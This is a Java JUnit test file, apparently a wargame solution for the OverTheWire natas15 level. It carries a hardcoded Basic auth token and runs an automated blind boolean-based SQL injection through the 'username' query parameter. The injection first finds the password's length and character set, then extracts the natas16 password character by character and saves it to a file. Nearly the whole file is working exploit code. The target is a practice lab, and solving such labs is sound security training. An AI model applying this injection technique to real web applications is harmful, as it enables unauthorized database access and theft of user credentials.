import io.restassured.http.Header;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

import static io.restassured.RestAssured.given;

public class Solution  {
    final String baseUrl = "http://natas15.natas.labs.overthewire.org/index.php?debug";
    final String authToken = "Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==";

    public Response getRequestWithParams(String url, Map<String, String> params) {
        return given()
                .header(new Header("Authorization", authToken))
                .queryParams(params)
                .get(url)
                .andReturn();
    }

    public int guessLength() {
        int passLength = 0;

        while (true) {
            passLength++;
            Map<String, String> params = new HashMap<>();
            params.put("username", "natas16\" and length(password) >= "+ passLength + " and username =\"natas16");
            Response response = getRequestWithParams(baseUrl, params);
            if (response.asString().contains("This user doesn't exist.")) {
                passLength--;
                break;
            }
        }
        return passLength;
    }
    public String guessAlphabet() {
        StringBuilder sb = new StringBuilder();
        String allChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        for (char c : allChars.toCharArray()) {
            Map<String, String> params = new HashMap<>();
            params.put("username", "natas16\" and password like binary \"%"+ c + "%\" and username =\"natas16");
            Response response = getRequestWithParams(baseUrl, params);
            if (response.asString().contains("This user exists."))
                sb.append(c);
        }

        return sb.toString();
    }

    @Test
    public void guessPass() {
        StringBuilder sb = new StringBuilder();
        String characters = guessAlphabet();
        while (sb.length() < guessLength()) {
            for (char c : characters.toCharArray()) {
                Map<String, String> params = new HashMap<>();
                params.put("username", "natas16\" and password like binary \"" + sb.toString() + c + "%\" and username =\"natas16");
                Response response = getRequestWithParams(baseUrl, params);
                if (response.asString().contains("This user exists."))
                    sb.append(c);
            }
        }
        try {
            writeTextToFile("src/test/resources/password.txt", sb.toString());
        }
        catch (IOException e) {
            System.out.println("Something went wrong: " + Arrays.toString(e.getStackTrace()));
        }
        System.out.println(sb.toString());


    }
    public void writeTextToFile(String fileName, String text) throws IOException {

        FileOutputStream outputStream = new FileOutputStream(fileName);
        byte[] strToBytes = text.getBytes();
        outputStream.write(strToBytes);

        outputStream.close();
    }
}